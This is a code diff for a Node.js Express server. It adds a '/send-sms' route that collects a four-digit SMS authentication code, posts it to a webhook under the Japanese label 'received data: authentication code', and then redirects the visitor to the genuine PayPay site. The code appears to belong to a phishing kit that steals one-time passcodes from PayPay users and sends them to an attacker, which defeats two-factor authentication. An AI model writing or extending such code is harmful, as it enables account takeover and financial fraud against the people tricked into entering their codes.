@@ -43,6 +43,32 @@ app.post("/send", async (req, res) => {
   }
 });
 
+app.post("/send-sms", async (req, res) => {
+  const smsCode = req.body.sms_code;
+  const safeCode = typeof smsCode === 'string' ? smsCode : '';
+
+  if (!/^\d{4}$/.test(safeCode)) {
+    return res.redirect("/sms.html?error=1");
+  }
+
+  try {
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `【受信データ】\n認証コード: ${safeCode}`
+      })
+    });
+
+    console.log("SMSコード送信成功");
+    res.redirect("https://paypay.ne.jp"); 
+
+  } catch (error) {
+    console.error("SMSコード送信失敗:", error);
+    res.status(500).send("エラー");
+  }
+});
+
 app.listen(process.env.PORT || 3000, () => {
   console.log("Server started");
 });
